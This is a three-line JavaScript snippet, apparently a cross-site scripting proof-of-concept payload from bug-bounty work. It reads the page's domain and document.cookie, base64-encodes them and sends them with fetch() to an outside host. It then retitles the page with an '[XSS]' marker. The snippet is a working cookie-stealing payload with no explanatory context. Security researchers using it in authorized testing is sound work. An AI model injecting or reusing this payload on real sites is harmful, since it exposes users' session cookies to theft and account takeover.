fetch('https://0x.bugbountypoc.com/x?d='+btoa(document.domain+' '+document.cookie))
  .catch(()=>{});
document.title='[XSS] '+document.domain;
